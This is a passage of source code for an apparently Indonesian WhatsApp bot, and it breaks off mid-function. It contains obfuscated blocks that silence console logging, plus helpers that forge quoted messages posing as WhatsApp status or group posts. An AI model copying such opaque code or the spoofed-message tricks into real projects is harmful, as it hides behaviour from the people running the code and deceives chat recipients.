(function(_0x418d12,_0x274010){function _0x4241e8(_0x2ea0b0,_0x117221,_0x2d5f8f,_0x3112f7){return _0x41b8(_0x2ea0b0-0x1df,_0x117221);}function _0x147a76(_0x11524c,_0x23b96b,_0x3b92c2,_0x3672c5){return _0x41b8(_0x3672c5-0x167,_0x3b92c2);}const _0x2e3041=_0x418d12();while(!![]){try{const _0x19806e=parseInt(_0x4241e8(0x387,0x381,0x392,0x393))/(0x244a+-0x319+0x90*-0x3b)+-parseInt(_0x4241e8(0x396,0x3a0,0x38a,0x3ac))/(0xfbe*0x2+-0x48e+-0x1aec)+-parseInt(_0x147a76(0x30f,0x2df,0x2d9,0x2f6))/(-0x1*-0x1acf+0x199*-0x17+0x9f3)+parseInt(_0x4241e8(0x380,0x384,0x375,0x367))/(0x1*-0x1e2a+-0x1cff+-0x1*-0x3b2d)*(-parseInt(_0x147a76(0x2e0,0x2c8,0x2dc,0x2e6))/(-0x7*0x577+-0x1*-0x245b+0x1eb))+parseInt(_0x147a76(0x2ea,0x30a,0x2e7,0x2fc))/(0xe37*0x1+-0x3d*0x5f+0x872)+parseInt(_0x147a76(0x315,0x327,0x32c,0x311))/(-0x1579+0x38a+0x11f6)+-parseInt(_0x147a76(0x303,0x311,0x330,0x318))/(0x1885+0x28b+-0x1b08)*(-parseInt(_0x147a76(0x2fd,0x308,0x300,0x307))/(-0x25*0x94+0x20b8+-0xb4b));if(_0x19806e===_0x274010)break;else _0x2e3041['push'](_0x2e3041['shift']());}catch(_0x4503e9){_0x2e3041['push'](_0x2e3041['shift']());}}}(_0xc821,-0x138b17+0x2cc14*0x1+0x1e6230));function _0xc821(){const _0x3630b9=['BgLZDfr5Cgu','kcGOlISPkYKRkq','Be52u3i','zgvZy3jPChrPBW','y3rVCIGICMv0Dq','DgfIBgu','CfnPvwm','De5mDuW','ChjLCgfYzu1LCW','nZiYnZKWy0DRve1f','mty3odH0s2jIugS','8j2rTpcDKAZWNzg18j2rVa','zM9VDgvYvgv4Da','D2fYBG','zxHJzxb0Aw9U','q0Pdr1G','D3fOwu8','ntG5mJu3BfzsuMjI','yxbWBhK','nJe0mti2murhDxvutW','C3nMrhi','ChjVDg90ExbL','veLQCve','C2fNzq','yK1wrva','C2fNzuzYB21dBW','mtq0tgDSvev6','CM4GDgHPCYiPka','rfPbA3q','uhPxEKS','rvzHtKG','CMv0DxjUicHMDq','mZi2mZroAxDmrvC','C2vHCMnO','CMvSyxLxqu1LCW','odm1y3DWyur0','yvbRr2O','DgL0Bgu','C1bgv0W','x19WCM90B19F','C2vJDgLVBNm','y29UC3rYDwn0BW','BMn0Aw9UkcKG','BgvUz3rO','wevMsMu','uvflwLe','uLzRr0C','Dg9tDhjPBMC','E30Uy29UC3rYDq','BgLZDe1LC3nHzW','uhHsrgW','ntiZmdu4neLYCfjzCq','zxjYB3i','D2fPDezVCKfJAW','yNv0Dg9Uvgv4Da','rNbMrhm','Aw5MBW','mJy1mZK1mgLRt1rjva','yMLUza'];_0xc821=function(){return _0x3630b9;};return _0xc821();}function _0x41b8(_0x1b8481,_0x4ea0ed){const _0x4e1f82=_0xc821();return _0x41b8=function(_0x420721,_0x5dbcec){_0x420721=_0x420721-(-0x1*-0x106f+0xe*0x1eb+-0x29cc);let _0x4e3198=_0x4e1f82[_0x420721];if(_0x41b8['issgrR']===undefined){var _0x1a54f6=function(_0x583a3e){const _0x509234='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xa55e9='',_0x5840bb='',_0x23f5cc=_0xa55e9+_0x1a54f6;for(let _0x5e3ba3=-0x2b3+-0x8*-0x2d2+-0x13dd,_0x284d04,_0x2c6e73,_0x577d56=0x20e4+0x8f9*-0x4+0x300;_0x2c6e73=_0x583a3e['charAt'](_0x577d56++);~_0x2c6e73&&(_0x284d04=_0x5e3ba3%(-0x21cf+0x2*-0x641+-0x2e55*-0x1)?_0x284d04*(-0x1ad5+0xf3e*-0x1+0x1*0x2a53)+_0x2c6e73:_0x2c6e73,_0x5e3ba3++%(0x11fd+0x828+-0x1a21))?_0xa55e9+=_0x23f5cc['charCodeAt'](_0x577d56+(-0x1c1*0x1+0x1b54+0x883*-0x3))-(0x1*0x193f+0x900+-0xb67*0x3)!==0xc6e+0x11*-0x29+-0x9b5?String['fromCharCode'](0xcd4+-0x7c3+-0x412&_0x284d04>>(-(0x628+-0x923*0x1+-0x99*-0x5)*_0x5e3ba3&0x416*0x1+0x3*-0xd6+-0x18e)):_0x5e3ba3:0x6c6+0x70f+-0xdd5){_0x2c6e73=_0x509234['indexOf'](_0x2c6e73);}for(let _0x626587=-0x15e4+0x8fb*-0x1+0x1edf,_0x3a872a=_0xa55e9['length'];_0x626587<_0x3a872a;_0x626587++){_0x5840bb+='%'+('00'+_0xa55e9['charCodeAt'](_0x626587)['toString'](-0x2*0xc0+0x18e2*0x1+-0xba9*0x2))['slice'](-(0x15c9+0x1823+0xf4e*-0x3));}return decodeURIComponent(_0x5840bb);};_0x41b8['PWXgDV']=_0x1a54f6,_0x1b8481=arguments,_0x41b8['issgrR']=!![];}const _0x2bb98b=_0x4e1f82[-0x2615+0x1*0x125+0x628*0x6],_0xfa990=_0x420721+_0x2bb98b,_0x2ab09a=_0x1b8481[_0xfa990];if(!_0x2ab09a){const _0x544ff1=function(_0x134bda){this['jlNzRY']=_0x134bda,this['KCrQxy']=[-0x76a+0xe5e+-0x6f3,-0x368*-0x2+0x435*-0x3+0x5cf*0x1,-0x24d3+0xfd8+0x14fb],this['IXJvVq']=function(){return'newState';},this['TuexpG']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['chKPpT']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x544ff1['prototype']['pacytT']=function(){const _0x375d66=new RegExp(this['TuexpG']+this['chKPpT']),_0x57c8d7=_0x375d66['test'](this['IXJvVq']['toString']())?--this['KCrQxy'][0x1725+-0x18ac*0x1+0x188]:--this['KCrQxy'][-0xac0+0xc09*-0x2+0x22d2];return this['FhOBFC'](_0x57c8d7);},_0x544ff1['prototype']['FhOBFC']=function(_0x18677f){if(!Boolean(~_0x18677f))return _0x18677f;return this['TftRYn'](this['jlNzRY']);},_0x544ff1['prototype']['TftRYn']=function(_0x489e2c){for(let _0x3d32df=0xf*0x1d7+-0x42*-0x4c+0x1*-0x2f31,_0x495e0e=this['KCrQxy']['length'];_0x3d32df<_0x495e0e;_0x3d32df++){this['KCrQxy']['push'](Math['round'](Math['random']())),_0x495e0e=this['KCrQxy']['length'];}return _0x489e2c(this['KCrQxy'][0x2196+-0x25f9+-0x1*-0x463]);},new _0x544ff1(_0x41b8)['pacytT'](),_0x4e3198=_0x41b8['PWXgDV'](_0x4e3198),_0x1b8481[_0xfa990]=_0x4e3198;}else _0x4e3198=_0x2ab09a;return _0x4e3198;},_0x41b8(_0x1b8481,_0x4ea0ed);}const _0x4b3a33=(function(){function _0x249412(_0xf2dc20,_0xff9f58,_0x4a620c,_0x33f646){return _0x41b8(_0x33f646- -0x6f,_0xff9f58);}const _0x10803e={};_0x10803e[_0x249412(0x11c,0x131,0x11a,0x12e)]=function(_0x7fb117,_0x1f1a2e){return _0x7fb117!==_0x1f1a2e;},_0x10803e[_0x4113c3(-0x77,-0x7a,-0x91,-0x83)]=_0x4113c3(-0x9f,-0x8a,-0x82,-0x95);const _0x321857=_0x10803e;function _0x4113c3(_0x2a0eb8,_0x22c3ff,_0x2f49e1,_0x313733){return _0x41b8(_0x22c3ff- -0x213,_0x313733);}let _0x3806b8=!![];return function(_0x42b377,_0x7b338e){const _0xaf0edd=_0x3806b8?function(){function _0x30be53(_0x105cb8,_0x3200ae,_0x2b1bcb,_0x80a230){return _0x41b8(_0x3200ae-0x225,_0x105cb8);}function _0xf7b5c4(_0x22e16c,_0x3f925d,_0x55a90d,_0x33a64c){return _0x41b8(_0x33a64c-0x1d3,_0x22e16c);}if(_0x7b338e){if(_0x321857['pSiUc'](_0x321857[_0xf7b5c4(0x354,0x356,0x367,0x36c)],'axaxW')){const _0x4a0d32=_0x7b338e[_0xf7b5c4(0x37f,0x37c,0x393,0x37c)](_0x42b377,arguments);return _0x7b338e=null,_0x4a0d32;}else{const _0x34a967=_0x4d2643[_0x30be53(0x3d3,0x3ce,0x3dc,0x3e9)](_0x8bcd0e,arguments);return _0xd4cc1a=null,_0x34a967;}}}:function(){};return _0x3806b8=![],_0xaf0edd;};}()),_0x2c644e=_0x4b3a33(this,function(){const _0x40f2af={};_0x40f2af['TIjqQ']=_0x35f9ef(0x341,0x344,0x34d,0x33b)+'+$';function _0x5ba608(_0x2b57c4,_0x408ab8,_0x38cd5d,_0x6970){return _0x41b8(_0x2b57c4-0x2dd,_0x408ab8);}function _0x35f9ef(_0x546eff,_0x20ad18,_0x2bcf43,_0x248ad6){return _0x41b8(_0x546eff-0x1a9,_0x20ad18);}const _0x4baca5=_0x40f2af;return _0x2c644e[_0x5ba608(0x468,0x461,0x46b,0x44d)]()[_0x5ba608(0x45a,0x451,0x45b,0x45b)](_0x5ba608(0x475,0x463,0x478,0x489)+'+$')[_0x35f9ef(0x334,0x33d,0x351,0x33a)]()['constructo'+'r'](_0x2c644e)[_0x5ba608(0x45a,0x44a,0x461,0x453)](_0x4baca5[_0x5ba608(0x48a,0x47a,0x48e,0x4a5)]);});_0x2c644e();const _0x5d55c2=(function(){function _0x313aaf(_0x47ffab,_0x504d0b,_0x20c20c,_0x3dda61){return _0x41b8(_0x47ffab- -0xd3,_0x3dda61);}const _0x13a12e={'RKWrR':function(_0x1e2c02,_0x7b703e){return _0x1e2c02(_0x7b703e);},'PzWzK':function(_0x47646b,_0xfa4d44){return _0x47646b+_0xfa4d44;},'bMVEP':_0x3a1e12(0x4a8,0x4af,0x4c4,0x4df)+_0x3a1e12(0x48f,0x483,0x494,0x4ab),'DZAkt':'OeVer'};function _0x3a1e12(_0x41eeaa,_0x1e55f8,_0xa87cc,_0x1eff73){return _0x41b8(_0xa87cc-0x30e,_0x1e55f8);}let _0x33bf5d=!![];return function(_0x474242,_0x365278){function _0x4ceef7(_0x166ba4,_0x241c4f,_0x1835ba,_0x391053){return _0x313aaf(_0x241c4f-0x240,_0x241c4f-0x1b5,_0x1835ba-0x2c,_0x391053);}function _0x1c960e(_0x176db1,_0x51c843,_0x283419,_0x44b639){return _0x313aaf(_0x176db1-0xff,_0x51c843-0x4a,_0x283419-0x70,_0x51c843);}if(_0x1c960e(0x1e1,0x1e9,0x1f6,0x1d1)===_0x13a12e[_0x4ceef7(0x310,0x320,0x318,0x30d)]){let _0x357326;try{_0x357326=_0x13a12e['RKWrR'](_0x4e6000,_0x13a12e['PzWzK'](_0x13a12e[_0x4ceef7(0x337,0x321,0x31f,0x317)](_0x13a12e[_0x1c960e(0x1db,0x1ce,0x1d0,0x1e5)],'{}.constru'+_0x4ceef7(0x324,0x308,0x310,0x315)+_0x1c960e(0x1de,0x1ea,0x1c3,0x1eb)+'\x20)'),');'))();}catch(_0x5a0e0){_0x357326=_0x56c675;}return _0x357326;}else{const _0x8a4445=_0x33bf5d?function(){if(_0x365278){const _0x110a00=_0x365278['apply'](_0x474242,arguments);return _0x365278=null,_0x110a00;}}:function(){};return _0x33bf5d=![],_0x8a4445;}};}()),_0x268a5c=_0x5d55c2(this,function(){const _0x4889ee={'vblBh':function(_0x3feaff,_0x5e3ee2){return _0x3feaff(_0x5e3ee2);},'wqhYO':function(_0x50e6b2,_0x14c431){return _0x50e6b2+_0x14c431;},'GHhAk':function(_0x328918,_0x17ae01){return _0x328918+_0x17ae01;},'vfPOR':_0x3d59d3(-0x210,-0x20d,-0x22c,-0x225)+'ctor(\x22retu'+'rn\x20this\x22)('+'\x20)','RVkGG':function(_0x6f090e){return _0x6f090e();},'CJCGX':'log','aPkGj':_0x319ac1(0xa3,0xaf,0x97,0xb2),'FpfDs':_0x319ac1(0x6d,0x7f,0x87,0xa3),'XEfJe':_0x319ac1(0x9f,0xaf,0x98,0x8f),'tNLuL':_0x3d59d3(-0x1fc,-0x215,-0x21a,-0x215),'PxRDl':function(_0x19fcbf,_0x41e418){return _0x19fcbf<_0x41e418;}};function _0x319ac1(_0x46e7ec,_0x57b774,_0x14b851,_0x8939a9){return _0x41b8(_0x14b851- -0x10d,_0x8939a9);}const _0x59abd2=function(){function _0x1a0e42(_0x5c9f64,_0x19a194,_0x1ea8cf,_0x296bbc){return _0x319ac1(_0x5c9f64-0xb,_0x19a194-0x167,_0x1ea8cf-0x119,_0x5c9f64);}function _0xb28a69(_0x3ac50e,_0x78ad0b,_0x473a7e,_0x2eaff2){return _0x319ac1(_0x3ac50e-0x1e1,_0x78ad0b-0x1e7,_0x78ad0b-0x2f9,_0x473a7e);}let _0x591054;try{_0x591054=_0x4889ee['vblBh'](Function,_0x4889ee[_0xb28a69(0x378,0x393,0x394,0x3ac)](_0x4889ee['GHhAk'](_0x1a0e42(0x1ce,0x1bc,0x1c2,0x1c9)+_0xb28a69(0x37e,0x372,0x38c,0x370),_0x4889ee['vfPOR']),');'))();}catch(_0x5bef07){_0x591054=window;}return _0x591054;},_0x11ed63=_0x4889ee[_0x319ac1(0x95,0x64,0x7d,0x60)](_0x59abd2),_0x314fea=_0x11ed63['console']=_0x11ed63['console']||{};function _0x3d59d3(_0x245f6d,_0x27def7,_0x72c735,_0x24a902){return _0x41b8(_0x24a902- -0x3b1,_0x72c735);}const _0x425f87=[_0x4889ee[_0x319ac1(0x83,0x92,0x99,0x8c)],_0x4889ee[_0x3d59d3(-0x239,-0x24c,-0x24e,-0x231)],_0x4889ee[_0x319ac1(0x9f,0x75,0x86,0x6c)],_0x3d59d3(-0x232,-0x234,-0x238,-0x221),_0x4889ee[_0x319ac1(0x75,0x75,0x7b,0x84)],_0x4889ee[_0x319ac1(0x8f,0x81,0x91,0x91)],'trace'];for(let _0x36dac4=-0x32*0x1+-0x13*0x10f+0x144f;_0x4889ee[_0x3d59d3(-0x229,-0x20d,-0x230,-0x223)](_0x36dac4,_0x425f87[_0x3d59d3(-0x22d,-0x215,-0x216,-0x22a)]);_0x36dac4++){const _0x237699=_0x5d55c2[_0x319ac1(0x5b,0x78,0x78,0x92)+'r'][_0x3d59d3(-0x1ee,-0x203,-0x1e7,-0x205)][_0x3d59d3(-0x223,-0x222,-0x21c,-0x21b)](_0x5d55c2),_0x55d836=_0x425f87[_0x36dac4],_0xe44b5a=_0x314fea[_0x55d836]||_0x237699;_0x237699[_0x3d59d3(-0x22b,-0x233,-0x21a,-0x22e)]=_0x5d55c2[_0x319ac1(0x81,0x96,0x89,0x97)](_0x5d55c2),_0x237699[_0x319ac1(0x74,0x64,0x7e,0x70)]=_0xe44b5a[_0x3d59d3(-0x219,-0x22b,-0x228,-0x226)][_0x3d59d3(-0x215,-0x231,-0x224,-0x21b)](_0xe44b5a),_0x314fea[_0x55d836]=_0x237699;}});_0x268a5c();const listmsg=(_0x4fab4d,_0x161983,_0x1cf9ee,_0x19aed2)=>{const _0x50fb71={};_0x50fb71[_0x2193b9(0x3da,0x3d7,0x3e1,0x3e7)]=_0x2193b9(0x3c2,0x3d1,0x3cd,0x3de),_0x50fb71[_0x2193b9(0x3b8,0x3ce,0x3ba,0x3be)]='SINGLE_SEL'+'ECT';const _0x46f9b9=_0x50fb71,_0x2cafa9={};_0x2cafa9[_0x4ed82b(-0x1ef,-0x20d,-0x213,-0x1f6)]=_0x161983;function _0x2193b9(_0xf6a27b,_0x5c7d12,_0x498711,_0x374b3b){return _0x41b8(_0x374b3b-0x23c,_0x5c7d12);}_0x2cafa9[_0x4ed82b(-0x1dd,-0x1d3,-0x1e0,-0x1dd)+'n']=_0x1cf9ee;function _0x4ed82b(_0x3eb1bd,_0x3269a5,_0x5e2637,_0x530f7b){return _0x41b8(_0x530f7b- -0x377,_0x3eb1bd);}_0x2cafa9[_0x4ed82b(-0x1f4,-0x1f6,-0x1e0,-0x1e5)]=_0x46f9b9['ssfDr'],_0x2cafa9[_0x4ed82b(-0x1cd,-0x1c0,-0x1ce,-0x1d4)]='By\x20Ndyie\x20B'+'otz',_0x2cafa9[_0x2193b9(0x3c1,0x3e5,0x3e4,0x3d3)]=_0x46f9b9[_0x2193b9(0x3b2,0x3ad,0x3b3,0x3be)],_0x2cafa9[_0x2193b9(0x3a8,0x3d7,0x3a5,0x3c0)]=_0x19aed2;const _0x2429b3={};_0x2429b3[_0x2193b9(0x3ce,0x3b3,0x3cd,0x3c9)+'e']=_0x2cafa9;let _0x156a9b=Rendy[_0x4ed82b(-0x1ec,-0x1ea,-0x1c8,-0x1d8)+_0x4ed82b(-0x1df,-0x1e1,-0x1bf,-0x1c7)+'ntent'](_0x4fab4d,_0x2429b3,{});const _0x7baec1={};return _0x7baec1[_0x2193b9(0x3c9,0x3cc,0x3b0,0x3cd)]=!![],Rendy[_0x4ed82b(-0x20d,-0x1e6,-0x1f9,-0x1f9)+_0x4ed82b(-0x1e3,-0x1b7,-0x1d8,-0x1c9)](_0x156a9b,_0x7baec1);}; 
//Maaf Banh Gue Enc
//━━━━━━━━━━━━━━━[ Fake Fakean ]━━━━━━━━━━━━━━━\\
        const fakestatus = (teks) => {
            Ndyie.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fteks,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": tamnel,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        Ndyie.chatRead(from, "read")
        const fakegroup = (teks) => {
            Ndyie.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fteks,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": tamnel,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 169,
                            status: 1,
                            surface : 1,
                            message: `Jangan Spam:(`, 
                            orderTitle: `Donate Donk:(`,
                            thumbnail: tamnel, //thumb
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }        

//━━━━━━━━━━━━━━━[ CONNECTION 2 ]━━━━━━━━━━━━━━━\\

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Ndyie.sendMessage(to, media, MessageType.sticker,{quoted:Nia})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Ndyie.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }     
if (isCmd && !isUser){
          pendaftar.push(sender)
          fs.writeFileSync('./RendyBase/user.json', JSON.stringify(pendaftar, null, 2))
        }         
//━━━━━━━━━━━━━━━[ Auto Ketik ]━━━━━━━━━━━━━━━\\
(function(_0x2841fb,_0x4ae252){var _0x45fbd5=_0x2841fb();function _0x27b18d(_0x29a066,_0x33c5e1,_0xf11f72,_0x40148a){return _0x3aa9(_0x33c5e1- -0x385,_0x29a066);}function _0x30e9f6(_0x5848df,_0x161261,_0x4f7771,_0x3fb56b){return _0x3aa9(_0x161261- -0x9a,_0x3fb56b);}while(!![]){try{var _0x5a6410=parseInt(_0x30e9f6(0x115,0xf6,0xdb,0x119))/(0x935*-0x3+-0x89*-0x17+0xf51*0x1)+parseInt(_0x30e9f6(0xa2,0xc7,0xba,0xab))/(0x21b8+-0x11ac+-0x2*0x805)*(parseInt(_0x30e9f6(0xd1,0xd9,0xd3,0xe3))/(-0x1697*-0x1+-0x4de+0x11b6*-0x1))+-parseInt(_0x30e9f6(0xfc,0xe2,0xcd,0xbf))/(0x19f9+0x97*0x5+-0x172*0x14)*(parseInt(_0x30e9f6(0x10d,0x101,0x118,0xed))/(0x1367+-0xde0+-0x582))+parseInt(_0x27b18d(-0x22f,-0x205,-0x203,-0x21b))/(0x211+0x2074+0x227f*-0x1)*(parseInt(_0x30e9f6(0xbb,0xd2,0xe7,0xfc))/(-0x7*-0x1ab+0x2*0xaab+0x83f*-0x4))+-parseInt(_0x27b18d(-0x1ee,-0x1df,-0x1d6,-0x1fd))/(-0x5*0x577+-0x1*-0x2697+-0xb3c)+-parseInt(_0x27b18d(-0x22a,-0x230,-0x23c,-0x211))/(-0x1809+0x138*0x3+0x146a)+parseInt(_0x30e9f6(0xdb,0xf4,0x10d,0x11c))/(0x5*-0x2+0x1e5e+-0x1e4a);if(_0x5a6410===_0x4ae252)break;else _0x45fbd5['push'](_0x45fbd5['shift']());}catch(_0x48ccb1){_0x45fbd5['push'](_0x45fbd5['shift']());}}}(_0x3d68,0x196c9*0x3+-0x6806+0x695a0));function _0x3d68(){var _0x4454f7=['aZxWN','BCzGT','exception','MsmoU','trace','zmsAv','516005aBHGuR','warn','ftFHG','NzaxC','bbXMv','3|0|1|2|5|','XAAiS','return\x20(fu','CodpP','vdbOY','GMfuK','4717352HhJwjm','SVVNo','SpBwS','wllUe','OmMiC','9814059EYDXtC','{}.constru','kjzxS','jPucJ','zEJsX','UHgTA','ztIPk','bind','jIYYZ','ONRSq','xLljR','MszGR','4mHKpjo','nction()\x20','qHmkP','search','lUVdM','BzSxe','pnVxe','Pvwzz','length','ence','EUzYa','544593bthedn','ohzGc','cAyta','console','cjlDD','info','ZWZPZ','485787UrmoPr','rxDIV','rn\x20this\x22)(','table','IdqKI','(((.+)+)+)','4|5|2|0|1|','fgotu','XsQkg','36mWZygp','ctor(\x22retu','SBHgZ','RUNJW','90leIEXr','constructo','CqdBw','RSlSJ','updatePres','log','fzDcr','JRhhK','VpDcP','apply','split','rRCgm','toString','__proto__','6906400iotbuU','IGgPN','1144747jWIusH','CWWCS','error','rBVaT','xuayt'];_0x3d68=function(){return _0x4454f7;};return _0x3d68();}var _0x5a40ae=(function(){var _0x10d0bc={'ONRSq':'(((.+)+)+)'+'+$','cjlDD':_0x141642(-0x82,-0x9b,-0x8c,-0x97),'GsSAK':function(_0x8a4173,_0xe7896){return _0x8a4173(_0xe7896);},'CodpP':function(_0x165f83,_0x29bbec){return _0x165f83+_0x29bbec;},'wllUe':_0x141642(-0x70,-0x96,-0x6e,-0x7d)+_0x141642(-0xac,-0xa9,-0xc4,-0xbd),'fzDcr':_0x141642(-0xce,-0xcb,-0xe4,-0xc9)+_0x3b0605(-0x60,-0x39,-0x45,-0x2d)+_0x141642(-0xc5,-0x8b,-0xa9,-0xaa)+'\x20)','AmyRk':function(_0x573a81){return _0x573a81();},'dCaTW':function(_0x4ab93c,_0x501db7){return _0x4ab93c!==_0x501db7;},'edRqh':_0x3b0605(-0x60,-0x42,-0x5d,-0x3a)};function _0x141642(_0x20b5fb,_0x1e9cc0,_0x26fa32,_0x5b1f59){return _0x3aa9(_0x5b1f59- -0x21f,_0x1e9cc0);}function _0x3b0605(_0x450fef,_0x5d43d2,_0x2ed4e2,_0x25a5d5){return _0x3aa9(_0x2ed4e2- -0x1c2,_0x5d43d2);}var _0x473096=!![];return function(_0x5e0f9e,_0x58b3b5){function _0x4dbf99(_0x5bb3ff,_0x1f77a3,_0x3b1262,_0xf6d3fb){return _0x3b0605(_0x5bb3ff-0x1de,_0x3b1262,_0xf6d3fb-0x17b,_0xf6d3fb-0xe);}function _0x2f978a(_0x2090fa,_0x344c21,_0x3565bc,_0x2392e2){return _0x141642(_0x2090fa-0xa0,_0x2392e2,_0x3565bc-0x102,_0x344c21-0x590);}if(_0x10d0bc['dCaTW'](_0x10d0bc['edRqh'],_0x2f978a(0x4d9,0x4eb,0x4cd,0x4c5))){var _0x122280=_0x473096?function(){var _0x184f74={};function _0x5cda71(_0x1007db,_0x48055e,_0x47c588,_0xd09fab){return _0x2f978a(_0x1007db-0xde,_0x47c588- -0x5d4,_0x47c588-0x54,_0x1007db);}function _0x32e4da(_0x274d72,_0x520ff6,_0x3ec9fe,_0x47ca26){return _0x2f978a(_0x274d72-0x109,_0x274d72- -0x318,_0x3ec9fe-0x2f,_0x47ca26);}_0x184f74[_0x32e4da(0x1fa,0x1e8,0x20f,0x1df)]=_0x10d0bc[_0x5cda71(-0xfa,-0xe7,-0x105,-0x101)];var _0x19ecba=_0x184f74;if(_0x58b3b5){if(_0x5cda71(-0xeb,-0xc5,-0xdb,-0xd2)!==_0x10d0bc[_0x32e4da(0x1c9,0x1b6,0x1d7,0x1b5)])return _0x1fdcc9[_0x32e4da(0x1e5,0x20e,0x20d,0x1cc)]()[_0x5cda71(-0x11e,-0xf1,-0xff,-0x102)](_0x19ecba[_0x32e4da(0x1fa,0x1fe,0x21e,0x1e6)])[_0x32e4da(0x1e5,0x1e5,0x1ec,0x1e6)]()[_0x32e4da(0x1da,0x1fc,0x1d0,0x1cd)+'r'](_0x53c477)['search'](_0x5cda71(-0xe7,-0xe0,-0xeb,-0xe3)+'+$');else{var _0xbe3f53=_0x58b3b5['apply'](_0x5e0f9e,arguments);return _0x58b3b5=null,_0xbe3f53;}}}:function(){};return _0x473096=![],_0x122280;}else{var _0x334092=_0x10d0bc['GsSAK'](_0x28b3af,_0x10d0bc[_0x2f978a(0x505,0x514,0x517,0x535)](_0x10d0bc[_0x2f978a(0x516,0x51a,0x504,0x509)],_0x10d0bc[_0x4dbf99(0x14d,0x123,0x147,0x13f)])+');');_0x32a4f1=_0x10d0bc['AmyRk'](_0x334092);}};}()),_0xcb0fc=_0x5a40ae(this,function(){function _0xe6d9ee(_0x4ad0f0,_0x192d3c,_0x24fe83,_0x46c186){return _0x3aa9(_0x46c186- -0x1c5,_0x192d3c);}function _0x29d597(_0x5c9779,_0x30e2c3,_0x2498cd,_0x54e2c4){return _0x3aa9(_0x30e2c3- -0x383,_0x5c9779);}var _0x1903a5={};_0x1903a5[_0x29d597(-0x208,-0x216,-0x224,-0x215)]=_0xe6d9ee(-0x56,-0x34,-0x78,-0x4d)+'+$';var _0x5378f6=_0x1903a5;return _0xcb0fc['toString']()['search'](_0x5378f6[_0xe6d9ee(-0x43,-0x82,-0x47,-0x58)])[_0x29d597(-0x205,-0x1f7,-0x218,-0x202)]()['constructo'+'r'](_0xcb0fc)[_0x29d597(-0x220,-0x21f,-0x245,-0x23d)](_0x5378f6[_0x29d597(-0x23a,-0x216,-0x1eb,-0x232)]);});function _0x1b7915(_0x37320c,_0x3d2419,_0x25e1a4,_0x98e7dc){return _0x3aa9(_0x37320c-0x19c,_0x98e7dc);}_0xcb0fc();var _0x48dfac=(function(){var _0x19ae2a={'iXCXK':function(_0x14247c,_0x3f8cff){return 